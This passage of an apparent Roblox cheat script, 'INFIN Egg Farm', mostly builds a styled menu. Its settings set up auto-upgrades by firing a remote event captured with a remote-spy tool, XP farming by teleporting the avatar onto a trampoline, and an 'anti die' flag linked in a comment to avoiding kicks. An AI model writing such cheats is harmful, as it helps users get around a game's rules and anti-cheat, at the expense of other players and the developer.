--[[
    INFIN EGG FARM
    INFIN v2 window: sidebar drawer, pages, floating logo button, toasts, petals + stars.
    Auto Farm: XP bar + AUTO UPGRADE (at 100%) + AUTO XP.
    Toggle the window with the floating logo button or RightShift.
]]

local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService       = game:GetService("RunService")
local TextService      = game:GetService("TextService")
local TweenService     = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player    = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")
local camera    = workspace.CurrentCamera

local LOGO_ID = "rbxassetid://88206773600496"
local BG_ID   = "rbxassetid://131683450353430"

local C = {
    violet   = Color3.fromRGB(150,  68, 240),
    violetDk = Color3.fromRGB( 94,  30, 176),
    blue     = Color3.fromRGB( 56, 128, 246),
    accent   = Color3.fromRGB(188, 152, 255),
    petal    = Color3.fromRGB(226, 190, 255),
    bg0      = Color3.fromRGB(  8,   7,  14),
    bg1      = Color3.fromRGB( 13,  11,  23),
    card     = Color3.fromRGB( 20,  17,  34),
    cardHi   = Color3.fromRGB( 30,  26,  50),
    line     = Color3.fromRGB( 56,  50,  90),
    field    = Color3.fromRGB( 11,  10,  20),
    off      = Color3.fromRGB( 42,  38,  62),
    white    = Color3.fromRGB(255, 255, 255),
    muted    = Color3.fromRGB(172, 164, 190),
    dim      = Color3.fromRGB(114, 106, 134),
    green    = Color3.fromRGB( 64, 224, 128),
    yellow   = Color3.fromRGB(246, 206,  76),
    red      = Color3.fromRGB(235,  72,  82),
    black    = Color3.fromRGB(  4,   3,   8),
}

local F = { bold = Enum.Font.GothamBold, med = Enum.Font.GothamMedium, reg = Enum.Font.Gotham }
local LEFT = Enum.TextXAlignment.Left
local AUTO_Y, AUTO_X = Enum.AutomaticSize.Y, Enum.AutomaticSize.X

local U, S, W, A = {}, {}, {}, {}
local XP -- xp bar detector (built further down)
local Stats -- xp rate tracker (built further down)
local Isle  -- islands + travel (built further down)

-- ============================================================
-- STATE
-- ============================================================
S.winOpen    = true
S.page       = "farm"
S.petals     = true
S.uiSize     = 1
S.drawerOpen = false
S.toggleKey  = Enum.KeyCode.RightShift
S.autoUpgrade = false

-- anti die is always on; flip to false ONLY to test if it's what gets you kicked
local ANTI_DIE_ENABLED = true
S.autoXP      = false
S.xpMethod    = "TP"     -- "TP" or "WEDGE"
S.tpGravity   = true     -- TP: huge gravity so you slam back down
S.tpHeight    = 4        -- TP: studs above the trampoline you drop from
S.wedgeDepth  = 1.5      -- WEDGE: how far inside the trampoline
S.wedgeWiggle = true     -- WEDGE: nudge up/down so every tick counts as a new touch
S.bounces     = 0

-- Cobalt capture: upgrade remote, fired with 1
local UPGRADE_RE  = "RE/7a5736faad675b28e619ec468d7876883eb17e59edfe2501264f0826c55dc239"
local UPGRADE_ARG = 1
local UPGRADE_DELAY = 0.3

-- AUTO XP bounces you on your own trampoline (no remotes)
--   TP    = keeps teleporting you down onto it (optionally with huge gravity)
--   WEDGE = wedges / anchors you inside it
local XP_DELAY = 0.3          -- seconds between bounces

-- ============================================================
-- UI HELPERS
-- ============================================================
function U.new(class, props)
    local o = Instance.new(class)
    local parent
    for k, v in pairs(props or {}) do
        if k == "Parent" then parent = v else o[k] = v end
    end
    if parent then o.Parent = parent end
    return o
end

function U.corner(inst, r)
    U.new("UICorner", { CornerRadius = UDim.new(0, r), Parent = inst })
    return inst
end

function U.round(inst)
    U.new("UICorner", { CornerRadius = UDim.new(1, 0), Parent = inst })
    return inst
end

function U.stroke(inst, color, thick, alpha)
    return U.new("UIStroke", {
        Color = color, Thickness = thick or 1, Transparency = alpha or 0,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = inst,
    })
end

function U.grad(inst, c1, c2, rot)
    return U.new("UIGradient", { Color = ColorSequence.new(c1, c2), Rotation = rot or 0, Parent = inst })
end

function U.pad(inst, t, r, b, l)
    U.new("UIPadding", {
        PaddingTop = UDim.new(0, t), PaddingRight = UDim.new(0, r),
        PaddingBottom = UDim.new(0, b), PaddingLeft = UDim.new(0, l), Parent = inst,
    })
end

function U.vlist(inst, gap)
    return U.new("UIListLayout", {
        FillDirection = Enum.FillDirection.Vertical, SortOrder = Enum.SortOrder.LayoutOrder,
        Padding = UDim.new(0, gap), Parent = inst,
    })
end

function U.hlist(inst, gap, align)
    return U.new("UIListLayout", {
        FillDirection = Enum.FillDirection.Horizontal, SortOrder = Enum.SortOrder.LayoutOrder,
        Padding = UDim.new(0, gap), VerticalAlignment = Enum.VerticalAlignment.Center,
        HorizontalAlignment = align or Enum.HorizontalAlignment.Left, Parent = inst,
    })
end

function U.label(parent, props)
    local base = {
        BackgroundTransparency = 1, Font = F.med, TextSize = 12,
        TextColor3 = C.white, TextXAlignment = LEFT, Parent = parent,
    }
    for k, v in pairs(props) do base[k] = v end
    return U.new("TextLabel", base)
end

function U.measure(txt, size, font)
    local ok, v = pcall(function()
        return TextService:GetTextSize(txt, size, font, Vector2.new(1000, 100))
    end)
    if ok and v then return v.X end
    return #txt * size * 0.6
end

function U.fadeLine(parent, props)
    local line = U.new("Frame", {
        BackgroundColor3 = C.white, BorderSizePixel = 0,
        Size = props.Size, Position = props.Position, AnchorPoint = props.AnchorPoint,
        Parent = parent,
    })
    U.new("UIGradient", {
        Color = ColorSequence.new(C.violet, C.blue),
        Transparency = props.Transparency or NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.2, 0.45),
            NumberSequenceKeypoint.new(0.8, 0.45),
            NumberSequenceKeypoint.new(1, 1),
        }),
        Parent = line,
    })
    return line
end

function U.drag(target, handle, clampFn, onClick)
    local dragging, start, origin, moved = false, nil, nil, false
    handle.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1
        and input.UserInputType ~= Enum.UserInputType.Touch then return end
        dragging, moved = true, false
        start, origin = input.Position, target.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                if dragging and not moved and onClick then onClick() end
                dragging = false
            end
        end)
    end)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType ~= Enum.UserInputType.MouseMovement
        and input.UserInputType ~= Enum.UserInputType.Touch then return end
        local d = input.Position - start
        if not moved and d.Magnitude < 6 then return end
        moved = true
        local x, y = origin.X.Offset + d.X, origin.Y.Offset + d.Y
        if clampFn then x, y = clampFn(x, y) end
        target.Position = UDim2.new(origin.X.Scale, x, origin.Y.Scale, y)
    end)
end

-- ---------- section (caption + fading rule) ----------
function U.section(parent, title, order)
    local wrap = U.new("Frame", {
        BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 0),
        AutomaticSize = AUTO_Y, LayoutOrder = order, Parent = parent,
    })
    U.vlist(wrap, 6)
    local head = U.new("Frame", {
        BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 14), LayoutOrder = 0, Parent = wrap,
    })
    U.label(head, { Text = title, Font = F.bold, TextSize = 10, TextColor3 = C.accent, Size = UDim2.new(1, 0, 1, 0) })
    local tw = U.measure(title, 10, F.bold)

    -- tap the title to fold the section away
    local arrow = U.label(head, {
        Text = "▾", Font = F.bold, TextSize = 11, TextColor3 = C.accent,
        Position = UDim2.fromOffset(tw + 4, -1), Size = UDim2.fromOffset(12, 16),
    })
    local hit = U.new("TextButton", { Text = "", BackgroundTransparency = 1, Size = UDim2.new(0, tw + 20, 1, 0), Parent = head })
    local collapsed = false
    local function apply()
        for _, c in ipairs(wrap:GetChildren()) do
            if c:IsA("GuiObject") and c ~= head then c.Visible = not collapsed end
        end
        TweenService:Create(arrow, TweenInfo.new(0.2), { Rotation = collapsed and -90 or 0 }):Play()
    end
    hit.MouseButton1Click:Connect(function()
        collapsed = not collapsed
        apply()
    end)
    wrap.ChildAdded:Connect(function(c)
        if collapsed and c:IsA("GuiObject") then task.defer(function() c.Visible = false end) end
    end)
    tw += 18
    U.fadeLine(head, {
        Size = UDim2.new(1, -(tw + 10), 0, 1), AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, 0, 0.5, 0),
        Transparency = NumberSequence.new(0.4, 1),
    })
    wrap:SetAttribute("n", 0)
    return wrap
end

function U.nextOrder(section)
    local n = (section:GetAttribute("n") or 0) + 1
    section:SetAttribute("n", n)
    return n
end

-- ---------- row (title + description) ----------
function U.row(section, title, desc)
    local h = desc and 44 or 36
    local r = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, h), BackgroundColor3 = C.card, BackgroundTransparency = 0.12,
        BorderSizePixel = 0, LayoutOrder = U.nextOrder(section), Parent = section,
    })
    U.corner(r, 10)
    local edge = U.stroke(r, C.line, 1, 0.55)
    U.grad(r, C.white, Color3.fromRGB(190, 184, 214), 90)
    r.MouseEnter:Connect(function()
        TweenService:Create(edge, TweenInfo.new(0.15), { Color = C.violet, Transparency = 0.2 }):Play()
    end)
    r.MouseLeave:Connect(function()
        TweenService:Create(edge, TweenInfo.new(0.2), { Color = C.line, Transparency = 0.55 }):Play()
    end)
    U.label(r, {
        Text = title, Font = F.bold, TextSize = 12,
        Position = UDim2.fromOffset(12, desc and 7 or 0),
        Size = desc and UDim2.new(0.6, 0, 0, 16) or UDim2.new(0.6, 0, 1, 0),
    })
    local d
    if desc then
        d = U.label(r, {
            Text = desc, Font = F.reg, TextSize = 10, TextColor3 = C.dim,
            TextTruncate = Enum.TextTruncate.AtEnd,
            Position = UDim2.fromOffset(12, 24), Size = UDim2.new(0.64, 0, 0, 13),
        })
    end
    return r, d
end

-- ---------- small pill button ----------
-- ---------- animations ----------
function U.ripple(btn)
    local r = U.new("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
        Size = UDim2.fromOffset(0, 0), BackgroundColor3 = C.white, BackgroundTransparency = 0.6,
        BorderSizePixel = 0, ZIndex = 5, Parent = btn,
    })
    U.round(r)
    local s = math.max(btn.AbsoluteSize.X, btn.AbsoluteSize.Y) * 1.6
    local tw = TweenService:Create(r, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { Size = UDim2.fromOffset(s, s), BackgroundTransparency = 1 })
    tw.Completed:Connect(function() r:Destroy() end)
    tw:Play()
end

function U.popIn(frame, delay)
    local sc = frame:FindFirstChild("PopScale") or U.new("UIScale", { Name = "PopScale", Parent = frame })
    sc.Scale = 0.88
    task.delay(delay or 0, function()
        TweenService:Create(sc, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
    end)
end

function U.pillBtn(row, text, xOffset, width, primary)
    local b = U.new("TextButton", {
        Text = "", AutoButtonColor = false, BackgroundTransparency = 1,
        Size = UDim2.fromOffset(width or 52, 24), AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, xOffset, 0.5, 0), BorderSizePixel = 0, Parent = row,
    })
    local fill = U.new("Frame", {
        Size = UDim2.fromScale(1, 1), BackgroundColor3 = primary and C.white or C.cardHi,
        BorderSizePixel = 0, Parent = b,
    })
    U.round(fill)
    if primary then U.grad(fill, C.violet, C.blue, 0) end
    U.stroke(fill, primary and Color3.fromRGB(176, 184, 255) or C.line, 1, primary and 0.45 or 0.3)
    U.label(b, {
        Name = "Label", Text = text, Font = F.bold, TextSize = 11, TextColor3 = C.white,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1), ZIndex = 2,
        TextStrokeColor3 = C.black, TextStrokeTransparency = 0.7,
    })
    local sc = U.new("UIScale", { Parent = b })
    b.ClipsDescendants = true
    b.MouseButton1Click:Connect(function()
        sc.Scale = 0.9
        TweenService:Create(sc, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
        U.ripple(b)
    end)
    return b
end

-- ---------- ON / OFF pill button (no toggle switch) ----------
function U.onOff(row, initial, onChanged)
    local b = U.new("TextButton", {
        Text = "", AutoButtonColor = false, BackgroundTransparency = 1, BorderSizePixel = 0,
        Size = UDim2.fromOffset(62, 26), AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -12, 0.5, 0), Parent = row,
    })
    local fill = U.new("Frame", { Size = UDim2.fromScale(1, 1), BorderSizePixel = 0, Parent = b })
    U.round(fill)
    local g = U.grad(fill, C.violet, C.blue, 0)
    local edge = U.stroke(fill, C.line, 1, 0.3)
    local gloss = U.new("Frame", {
        Size = UDim2.new(1, -4, 0.5, 0), Position = UDim2.fromOffset(2, 1),
        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 2, Parent = b,
    })
    U.round(gloss)
    U.new("UIGradient", { Rotation = 90, Transparency = NumberSequence.new(0, 1), Parent = gloss })
    local lbl = U.label(b, {
        Text = "OFF", Font = F.bold, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Center,
        Size = UDim2.fromScale(1, 1), ZIndex = 3,
    })
    local sc = U.new("UIScale", { Parent = b })

    local state = initial
    local function paint()
        fill.BackgroundColor3 = state and C.white or C.cardHi
        g.Enabled = state
        edge.Color = state and Color3.fromRGB(176, 184, 255) or C.line
        edge.Transparency = state and 0.45 or 0.3
        gloss.BackgroundTransparency = state and 0.8 or 0.93
        lbl.Text = state and "ON" or "OFF"
        lbl.TextColor3 = state and C.white or C.muted
    end
    paint()

    b.MouseButton1Click:Connect(function()
        state = not state
        paint()
        U.ripple(b)
        sc.Scale = 0.92
        TweenService:Create(sc, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
        if onChanged then task.spawn(onChanged, state) end
    end)
    local function set(v, silent)
        if v == state then return end
        state = v
        paint()
        if onChanged and not silent then task.spawn(onChanged, state) end
    end
    return function() return state end, set
end

-- ============================================================
-- WINDOW
-- ============================================================
local WIN_W, WIN_H, TOP_H, RADIUS = 420, 380, 52, 16
local DRAWER_W = 200

do
    local old = PlayerGui:FindFirstChild("InfinEggFarm")
    if old then old:Destroy() end
end

W.gui = U.new("ScreenGui", {
    Name = "InfinEggFarm", ResetOnSpawn = false, IgnoreGuiInset = true,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling, DisplayOrder = 100, Parent = PlayerGui,
})

W.win = U.new("Frame", {
    Name = "Window", AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
    Size = UDim2.fromOffset(WIN_W, WIN_H), BackgroundTransparency = 1, BorderSizePixel = 0,
    Parent = W.gui,
})
W.fit = U.new("UIScale", { Scale = 1, Parent = W.win })

-- soft drop shadow
do
    local sh = U.new("Frame", {
        Size = UDim2.new(1, 16, 1, 16), Position = UDim2.fromOffset(-8, -2),
        BackgroundColor3 = Color3.new(0, 0, 0), BackgroundTransparency = 0.6, BorderSizePixel = 0,
        ZIndex = 0, Parent = W.win,
    })
    U.corner(sh, RADIUS + 8)
    local sh2 = U.new("Frame", {
        Size = UDim2.new(1, 6, 1, 6), Position = UDim2.fromOffset(-3, 0),
        BackgroundColor3 = Color3.new(0, 0, 0), BackgroundTransparency = 0.45, BorderSizePixel = 0,
        ZIndex = 0, Parent = W.win,
    })
    U.corner(sh2, RADIUS + 3)
end

-- background with aurora gradient, texture and top sheen
W.bg = U.new("Frame", {
    Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.white, BorderSizePixel = 0,
    ClipsDescendants = true, Parent = W.win,
})
U.corner(W.bg, RADIUS)
U.new("UIGradient", {
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,    Color3.fromRGB(26, 14, 44)),
        ColorSequenceKeypoint.new(0.45, C.bg0),
        ColorSequenceKeypoint.new(1,    Color3.fromRGB(10, 16, 36)),
    }),
    Rotation = 35, Parent = W.bg,
})
do
    local tex = U.new("ImageLabel", {
        Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Image = BG_ID,
        ScaleType = Enum.ScaleType.Crop, ImageTransparency = 0.84, Parent = W.bg,
    })
    U.corner(tex, RADIUS)
    local sheen = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 90), BackgroundColor3 = C.white, BackgroundTransparency = 0.94,
        BorderSizePixel = 0, Parent = W.bg,
    })
    U.corner(sheen, RADIUS)
    U.new("UIGradient", { Rotation = 90, Transparency = NumberSequence.new(0, 1), Parent = sheen })
end
W.petalLayer = U.new("Frame", {
    Name = "Petals", Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Parent = W.bg,
})

-- rounded border
do
    local rim = U.new("Frame", {
        Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, BorderSizePixel = 0, Parent = W.win,
    })
    U.corner(rim, RADIUS)
    local st = U.stroke(rim, C.white, 1, 0.1)
    U.new("UIGradient", {
        Color = ColorSequence.new(Color3.fromRGB(120, 108, 170), Color3.fromRGB(46, 40, 72)),
        Rotation = 90, Parent = st,
    })
end

-- ---------- top bar ----------
W.main = U.new("Frame", { Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Parent = W.win })

do
    local top = U.new("Frame", { Size = UDim2.new(1, 0, 0, TOP_H), BackgroundTransparency = 1, Parent = W.main })
    W.top = top

    -- hamburger (3 lines -> X)
    local burger = U.new("TextButton", {
        Text = "", AutoButtonColor = false, Size = UDim2.fromOffset(32, 32),
        AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 12, 0.5, 0),
        BackgroundColor3 = C.card, BorderSizePixel = 0, Parent = top,
    })
    U.corner(burger, 9)
    U.stroke(burger, C.line, 1, 0.3)
    W.burger = burger
    W.burgerBars = {}
    for i = 1, 3 do
        local bar = U.new("Frame", {
            Size = UDim2.fromOffset(14, 2), AnchorPoint = Vector2.new(0.5, 0.5),
            Position = UDim2.new(0.5, 0, 0.5, (i - 2) * 5), BackgroundColor3 = C.white,
            BorderSizePixel = 0, Parent = burger,
        })
        U.round(bar)
        W.burgerBars[i] = bar
    end

    local logo = U.new("Frame", {
        Size = UDim2.fromOffset(26, 26), AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 54, 0.5, 0),
        BackgroundColor3 = C.card, BorderSizePixel = 0, Parent = top,
    })
    U.round(logo)
    local ls = U.stroke(logo, C.white, 1.4, 0)
    U.grad(ls, C.violet, C.blue, 45)
    local li = U.new("ImageLabel", {
        Size = UDim2.new(1, -4, 1, -4), Position = UDim2.fromOffset(2, 2), BackgroundTransparency = 1,
        Image = LOGO_ID, ScaleType = Enum.ScaleType.Crop, Parent = logo,
    })
    U.round(li)

    W.pageTitle = U.label(top, {
        Text = "Auto Farm", Font = F.bold, TextSize = 14,
        Position = UDim2.fromOffset(88, 10), Size = UDim2.new(0.45, 0, 0, 17),
    })
    W.pageSub = U.label(top, {
        Text = "Automatic", Font = F.med, TextSize = 9, TextColor3 = C.dim,
        Position = UDim2.fromOffset(88, 28), Size = UDim2.new(0.45, 0, 0, 12),
        TextTruncate = Enum.TextTruncate.AtEnd,
    })

    local right = U.new("Frame", {
        BackgroundTransparency = 1, AutomaticSize = AUTO_X, Size = UDim2.new(0, 0, 1, 0),
        AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -12, 0, 0), Parent = top,
    })
    U.hlist(right, 6, Enum.HorizontalAlignment.Right)

    -- status pill
    local pill = U.new("Frame", {
        AutomaticSize = AUTO_X, Size = UDim2.new(0, 0, 0, 22), BackgroundColor3 = C.card,
        BorderSizePixel = 0, LayoutOrder = 1, Parent = right,
    })
    U.round(pill)
    W.pillEdge = U.stroke(pill, C.line, 1, 0.3)
    U.pad(pill, 0, 9, 0, 8)
    U.hlist(pill, 5)
    W.pillDot = U.new("Frame", {
        Size = UDim2.fromOffset(6, 6), BackgroundColor3 = C.red, BorderSizePixel = 0, LayoutOrder = 1, Parent = pill,
    })
    U.round(W.pillDot)
    W.pillText = U.label(pill, {
        Text = "IDLE", Font = F.bold, TextSize = 8, AutomaticSize = AUTO_X,
        Size = UDim2.new(0, 0, 1, 0), LayoutOrder = 2,
    })

    local minBtn = U.new("TextButton", {
        Text = "", AutoButtonColor = false, Size = UDim2.fromOffset(26, 26),
        BackgroundColor3 = C.card, BorderSizePixel = 0, LayoutOrder = 2, Parent = right,
    })
    U.corner(minBtn, 8)
    U.stroke(minBtn, C.line, 1, 0.3)
    local mb = U.new("Frame", {
        Size = UDim2.fromOffset(10, 2), AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromScale(0.5, 0.5), BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = minBtn,
    })
    U.round(mb)
    W.minBtn = minBtn

    U.fadeLine(W.main, { Size = UDim2.new(1, -28, 0, 1), Position = UDim2.fromOffset(14, TOP_H) })
end

W.pagesHolder = U.new("Frame", {
    Size = UDim2.new(1, -6, 1, -(TOP_H + 11 + 28)), Position = UDim2.fromOffset(0, TOP_H + 1),
    BackgroundTransparency = 1, ClipsDescendants = true, Parent = W.main,
})

-- ---------- slide-out tab drawer ----------
W.overlay = U.new("Frame", {
    Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ClipsDescendants = true,
    ZIndex = 5, Parent = W.win,
})
W.backdrop = U.new("TextButton", {
    Text = "", AutoButtonColor = false, Size = UDim2.fromScale(1, 1),
    BackgroundColor3 = Color3.new(0, 0, 0), BackgroundTransparency = 1,
    BorderSizePixel = 0, Visible = false, Parent = W.overlay,
})
U.corner(W.backdrop, RADIUS)

W.drawer = U.new("Frame", {
    Size = UDim2.new(0, DRAWER_W, 1, -16), Position = UDim2.fromOffset(-DRAWER_W - 20, 8),
    BackgroundColor3 = C.bg1, BorderSizePixel = 0, Visible = false, ZIndex = 2, Parent = W.overlay,
})
U.corner(W.drawer, 13)
U.stroke(W.drawer, C.line, 1, 0.2)
U.grad(W.drawer, C.white, Color3.fromRGB(170, 160, 200), 90)

do
    local head = U.new("Frame", { Size = UDim2.new(1, 0, 0, 58), BackgroundTransparency = 1, Parent = W.drawer })
    local ring = U.new("Frame", {
        Size = UDim2.fromOffset(32, 32), Position = UDim2.fromOffset(12, 13),
        BackgroundColor3 = C.card, BorderSizePixel = 0, Parent = head,
    })
    U.round(ring)
    local rs = U.stroke(ring, C.white, 1.5, 0)
    U.grad(rs, C.violet, C.blue, 45)
    local img = U.new("ImageLabel", {
        Size = UDim2.new(1, -4, 1, -4), Position = UDim2.fromOffset(2, 2), BackgroundTransparency = 1,
        Image = LOGO_ID, ScaleType = Enum.ScaleType.Crop, Parent = ring,
    })
    U.round(img)
    local t = U.label(head, {
        Text = "INFIN", Font = F.bold, TextSize = 16,
        Position = UDim2.fromOffset(52, 13), Size = UDim2.fromOffset(56, 18),
    })
    U.grad(t, C.white, C.accent, 0)
    U.label(head, {
        Text = "egg farm", Font = F.med, TextSize = 9, TextColor3 = C.dim,
        Position = UDim2.fromOffset(52, 31), Size = UDim2.fromOffset(90, 12),
    })
    local ver = U.new("Frame", {
        Size = UDim2.fromOffset(22, 14), Position = UDim2.fromOffset(108, 15),
        BackgroundColor3 = C.violet, BackgroundTransparency = 0.72, BorderSizePixel = 0, Parent = head,
    })
    U.round(ver)
    U.label(ver, {
        Text = "V2", Font = F.bold, TextSize = 8, TextColor3 = C.accent,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1),
    })
    U.fadeLine(W.drawer, { Size = UDim2.new(1, -24, 0, 1), Position = UDim2.fromOffset(12, 58) })
end

W.nav = U.new("ScrollingFrame", {
    Size = UDim2.new(1, -16, 1, -124), Position = UDim2.fromOffset(8, 66),
    BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 0,
    CanvasSize = UDim2.new(), AutomaticCanvasSize = AUTO_Y, Parent = W.drawer,
})
U.vlist(W.nav, 4)

-- drawer status card
do
    local card = U.new("Frame", {
        Size = UDim2.new(1, -16, 0, 44), Position = UDim2.new(0, 8, 1, -52),
        BackgroundColor3 = C.card, BorderSizePixel = 0, Parent = W.drawer,
    })
    U.corner(card, 10)
    U.stroke(card, C.line, 1, 0.45)
    W.sideDot = U.new("Frame", {
        Size = UDim2.fromOffset(8, 8), Position = UDim2.fromOffset(12, 11),
        BackgroundColor3 = C.red, BorderSizePixel = 0, Parent = card,
    })
    U.round(W.sideDot)
    W.sideText = U.label(card, {
        Text = "IDLE", Font = F.bold, TextSize = 10,
        Position = UDim2.fromOffset(26, 7), Size = UDim2.new(1, -32, 0, 14),
    })
    W.sideSub = U.label(card, {
        Text = "Infin Egg Farm", Font = F.med, TextSize = 9, TextColor3 = C.dim,
        Position = UDim2.fromOffset(12, 24), Size = UDim2.new(1, -20, 0, 12),
    })
end

function A.setDrawer(open)
    S.drawerOpen = open
    local ti = TweenInfo.new(0.24, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    if open then
        W.backdrop.Visible, W.drawer.Visible = true, true
        local i = 0
        for _, nb in pairs(W.navBtns) do
            i += 1
            U.popIn(nb.btn, 0.04 * (nb.btn.LayoutOrder or i))
        end
    end
    TweenService:Create(W.backdrop, ti, { BackgroundTransparency = open and 0.45 or 1 }):Play()
    local tw = TweenService:Create(W.drawer, ti, {
        Position = open and UDim2.fromOffset(8, 8) or UDim2.fromOffset(-DRAWER_W - 20, 8),
    })
    tw.Completed:Connect(function()
        if not S.drawerOpen then W.backdrop.Visible, W.drawer.Visible = false, false end
    end)
    tw:Play()
    local b = W.burgerBars
    TweenService:Create(b[1], ti, { Rotation = open and 45 or 0, Position = UDim2.new(0.5, 0, 0.5, open and 0 or -5) }):Play()
    TweenService:Create(b[2], ti, { BackgroundTransparency = open and 1 or 0 }):Play()
    TweenService:Create(b[3], ti, { Rotation = open and -45 or 0, Position = UDim2.new(0.5, 0, 0.5, open and 0 or 5) }):Play()
end
W.burger.MouseButton1Click:Connect(function() A.setDrawer(not S.drawerOpen) end)
W.backdrop.MouseButton1Click:Connect(function() A.setDrawer(false) end)

W.pages, W.navBtns = {}, {}

function A.navButton(key, title, sub, icon, order, onClick)
    local nb = U.new("TextButton", {
        Text = "", AutoButtonColor = false, Size = UDim2.new(1, 0, 0, 46),
        BackgroundColor3 = C.white, BackgroundTransparency = 1, BorderSizePixel = 0,
        LayoutOrder = order, Parent = W.nav,
    })
    U.corner(nb, 11)
    local ng = U.grad(nb, C.violet, C.blue, 0)
    ng.Transparency = NumberSequence.new(0.55, 0.85)

    local ibox = U.new("Frame", {
        Size = UDim2.fromOffset(30, 30), AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 8, 0.5, 0),
        BackgroundColor3 = C.card, BorderSizePixel = 0, Parent = nb,
    })
    U.corner(ibox, 9)
    local istroke = U.stroke(ibox, C.line, 1, 0.3)
    local igrad = U.grad(ibox, C.violet, C.blue, 45)
    igrad.Enabled = false
    local ic = U.label(ibox, {
        Text = icon, Font = F.bold, TextSize = 14, TextColor3 = C.muted,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1),
    })
    local nm = U.label(nb, {
        Text = title, Font = F.bold, TextSize = 12, TextColor3 = C.muted,
        Position = UDim2.fromOffset(48, 8), Size = UDim2.new(1, -54, 0, 15),
    })
    U.label(nb, {
        Text = sub, Font = F.reg, TextSize = 9, TextColor3 = C.dim, TextTruncate = Enum.TextTruncate.AtEnd,
        Position = UDim2.fromOffset(48, 25), Size = UDim2.new(1, -54, 0, 12),
    })
    nb.MouseButton1Click:Connect(function()
        onClick()
        A.setDrawer(false)
    end)
    W.navBtns[key] = { btn = nb, ibox = ibox, igrad = igrad, istroke = istroke, icon = ic, name = nm }
end

-- a page; pages with a group share one drawer entry and get a sub-tab bar
function A.page(key, title, sub, icon, order, group)
    local sf = U.new("ScrollingFrame", {
        Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, BorderSizePixel = 0,
        CanvasSize = UDim2.new(), AutomaticCanvasSize = AUTO_Y, ScrollBarThickness = 2,
        ScrollBarImageColor3 = C.violet, ScrollingDirection = Enum.ScrollingDirection.Y,
        Visible = false, Parent = W.pagesHolder,
    })
    U.pad(sf, 12, 14, 16, 14)
    U.vlist(sf, 14)
    W.pages[key] = { frame = sf, title = title, sub = sub, group = group }
    if not group then
        A.navButton(key, title, sub, icon, order, function() A.showPage(key) end)
    end
    return sf
end

W.groupLast = {}
function A.navGroup(gkey, title, sub, icon, order, keys)
    W.groupLast[gkey] = keys[1]
    A.navButton(gkey, title, sub, icon, order, function() A.showPage(W.groupLast[gkey]) end)

    -- sub-tab bar at the top of every page in the group
    for _, key in ipairs(keys) do
        local bar = U.new("Frame", {
            Size = UDim2.new(1, 0, 0, 32), BackgroundColor3 = C.field, BorderSizePixel = 0,
            LayoutOrder = -10, Parent = W.pages[key].frame,
        })
        U.corner(bar, 10)
        U.stroke(bar, C.line, 1, 0.45)
        local n = #keys
        local active = table.find(keys, key)
        local slider = U.new("Frame", {
            Size = UDim2.new(1 / n, -6, 1, -6), Position = UDim2.new((active - 1) / n, 3, 0, 3),
            BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = bar,
        })
        U.corner(slider, 8)
        U.grad(slider, C.violet, C.blue, 0)
        W.pages[key].slider, W.pages[key].sliderIndex, W.pages[key].groupSize = slider, active, n
        for i, k in ipairs(keys) do
            local b = U.new("TextButton", {
                Text = W.pages[k].title:upper(), Font = F.bold, TextSize = 11,
                TextColor3 = (i == active) and C.white or C.muted, BackgroundTransparency = 1,
                AutoButtonColor = false, ZIndex = 2,
                Size = UDim2.new(1 / n, 0, 1, 0), Position = UDim2.new((i - 1) / n, 0, 0, 0), Parent = bar,
            })
            b.MouseButton1Click:Connect(function()
                if k ~= key then
                    W.groupLast[gkey] = k
                    A.showPage(k, key)
                end
            end)
        end
    end
end

function A.showPage(key, fromKey)
    S.page = key
    local page = W.pages[key]
    local navKey = page.group or key
